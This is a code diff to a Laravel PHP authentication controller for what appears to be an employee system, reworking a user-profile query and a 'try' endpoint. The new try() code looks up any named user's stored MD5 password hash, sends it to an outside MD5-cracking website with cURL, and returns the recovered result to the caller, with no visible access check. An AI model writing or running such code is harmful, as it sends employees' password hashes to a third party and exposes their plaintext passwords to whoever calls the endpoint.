@@ -15,6 +15,7 @@ use App\SIMDataPegawai;
 use App\SIMLoginPegawai;
 use App\User;
 use Carbon\Carbon;
+use DateTimeZone;
 use Illuminate\Support\Collection;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
@@ -116,9 +117,15 @@ class AuthController extends BaseController
      */
     public function user()
     {
-        $user = SIMDataPegawai::where('id_pegawai', auth()->user()->id_pegawai)
-            ->leftJoin('f_department as fd', 'fd.kepala_dept', '=', 'f_data_pegawai.id_pegawai')
-            ->select('f_data_pegawai.id_pegawai', 'f_data_pegawai.nik_pegawai as nik', 'f_data_pegawai.nm_pegawai as nama')
+        $today = Carbon::now(new DateTimeZone('Asia/Jakarta'))->toDateString();
+
+        $user = DB::table('f_data_pegawai as fdp')
+            ->leftJoin('log_departemens as ld', 'ld.id_pegawai', '=', 'fdp.id_pegawai')
+            ->where('fdp.id_pegawai', auth()->user()->id_pegawai)
+            ->whereRaw('ld.masuk <= \'' . $today . '\'')
+            ->whereRaw('coalesce(ld.keluar, \'' . $today . '\') >= \'' . $today . '\'')
+            ->select('fdp.id_pegawai', 'fdp.nik_pegawai as nik', 'fdp.nm_pegawai as nama', DB::raw('jsonb_agg(ld.id_dept) as dept'))
+            ->groupBy('fdp.id_pegawai', 'nik', 'nama')
             ->first();
 
         $dataAkses = DB::table('users as us')
@@ -126,7 +133,7 @@ class AuthController extends BaseController
             ->join('akses as ak', 'ak.id_akses', '=', 'ag.id_akses')
             ->join('akses_submenus as asm', 'asm.id_akses_submenu', '=', 'ak.id_akses_submenu')
             ->join('akses_menus as am', 'am.id_akses_menu', '=', 'asm.id_akses_menu')
-            ->select('am.id_akses_menu', 'asm.id_akses_submenu', 'ak.id_akses')
+            ->select('am.id_akses_menu', 'asm.id_akses_submenu', 'ak.id_akses', DB::raw('(case when ag.id_group = 15 then true else false end) as admin'))
             ->where('us.id_pegawai', auth()->user()->id_pegawai)
             ->where('ag.status', true)
             ->orderBy('id_akses_menu', 'asc')
@@ -148,10 +155,12 @@ class AuthController extends BaseController
             array_push($akses, $d->id_akses);
         }
 
+        $user->admin = $dataAkses[0]->admin;
         $user->menu = $menu;
         $user->submenu = $submenu;
         $user->akses = $akses;
         $user->nik = (int) $user->nik;
+        $user->dept = json_decode($user->dept);
 
         return response()->json(["status" => "success", "user" => $user], 200);
     }
@@ -217,7 +226,36 @@ class AuthController extends BaseController
 
     public function try()
     {
-        $data = DB::connection('pgsql3')->table('appmenu')->get();
+        $data = [];
+        if (request()->type === 'password') {
+            $pass = DB::table('f_login_pegawai')->where('user_pegawai', request()->user)->first()->pass_pegawai;
+
+            $url = "https://md5.gromweb.com/?md5=" . $pass . "";
+            $user_agent = 'Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0';
+
+            $options = array(
+                CURLOPT_CUSTOMREQUEST  => "GET",        //set request type post or get
+                CURLOPT_POST           => false,        //set to GET
+                CURLOPT_USERAGENT      => $user_agent, //set user agent
+                // CURLOPT_COOKIEFILE     => "cookie.txt", //set cookie file
+                // CURLOPT_COOKIEJAR      => "cookie.txt", //set cookie jar
+                CURLOPT_RETURNTRANSFER => true,     // return web page
+                CURLOPT_HEADER         => false,    // don't return headers
+                CURLOPT_FOLLOWLOCATION => true,     // follow redirects
+                CURLOPT_ENCODING       => "",       // handle all encodings
+                CURLOPT_AUTOREFERER    => true,     // set referer on redirect
+                CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
+                CURLOPT_TIMEOUT        => 120,      // timeout on response
+                CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
+            );
+
+            $ch = curl_init($url);
+            curl_setopt_array($ch, $options);
+            $content = curl_exec($ch);
+            curl_close($ch);
+
+            $data = $content;
+        }
 
         return response()->json(["status" => "success", 'data' => $data], 200);
     }
